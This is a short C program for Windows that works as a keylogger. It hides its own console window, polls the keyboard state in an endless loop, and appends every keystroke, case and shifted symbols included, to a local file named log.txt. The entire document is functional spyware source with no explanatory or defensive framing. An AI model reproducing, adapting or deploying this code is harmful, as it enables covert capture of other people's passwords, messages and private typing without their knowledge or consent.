#include <stdio.h>
#include <windows.h>

  int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    FILE *file;
    short key;
    file = fopen("log.txt","w");
    if(file) fclose(file);

while(1) {
    Sleep(10);
      for(key = 8; key <= 256; key++) {
      if(GetAsyncKeyState(key) == -32767) {
      file = fopen("log.txt","a+");
        if(file) {
        if(key >= 65 && key <= 90) {
        int isShift = GetAsyncKeyState(VK_SHIFT);
        int isCaps = (GetKeyState(VK_CAPITAL) & 0x0001);
        if(isShift ^ isCaps)
        fprintf(file,"%c", key);
      else
    fprintf(file,"%c", key + 32);
    }
else if(key >= 48 && key <= 57) {
  if(GetAsyncKeyState(VK_SHIFT)) {
  switch(key) {
  case 48: fprintf(file,")"); break;
  case 49: fprintf(file,"!"); break;
  case 50: fprintf(file,"@"); break;
  case 51: fprintf(file,"#"); break;
  case 52: fprintf(file,"$"); break;
  case 53: fprintf(file,"%%"); break;
  case 54: fprintf(file,"^"); break;
  case 55: fprintf(file,"&"); break;
  case 56: fprintf(file,"*"); break;
  case 57: fprintf(file,"("); break;
}
} else {
   fprintf(file,"%c", key);
}
}

else {
  if(key == VK_SPACE) 
    fprintf(file," ");
    else if(key == VK_BACK) 
    fprintf(file,"[BACKSPACE]");
    else if(key == VK_RETURN) 
    fprintf(file,"\n");
    else if(key == VK_TAB) 
    fprintf(file,"\t");
    else if(GetAsyncKeyState(VK_SHIFT)) {
    switch(key) {
    case 186: fprintf(file,":"); break; 
    case 187: fprintf(file,"+"); break; 
    case 188: fprintf(file,"<"); break; 
    case 189: fprintf(file,"_"); break; 
    case 190: fprintf(file,">"); break; 
    case 191: fprintf(file,"?"); break; 
    case 192: fprintf(file,"~"); break; 
    case 219: fprintf(file,"{"); break; 
    case 220: fprintf(file,"|"); break; 
    case 221: fprintf(file,"}"); break; 
    case 222: fprintf(file,"\""); break; 
    }
    } else {
    switch(key) {
    case 186: fprintf(file,";"); break;
    case 187: fprintf(file,"="); break;
    case 188: fprintf(file,","); break;
    case 189: fprintf(file,"-"); break;
    case 190: fprintf(file,"."); break;
    case 191: fprintf(file,"/"); break;
    case 192: fprintf(file,"`"); break;
    case 219: fprintf(file,"["); break;
    case 220: fprintf(file,"\\"); break;
    case 221: fprintf(file,"]"); break;
    case 222: fprintf(file,"'"); break;
    }
}
}

fclose(file);
}
}
}
}
return 0;
}

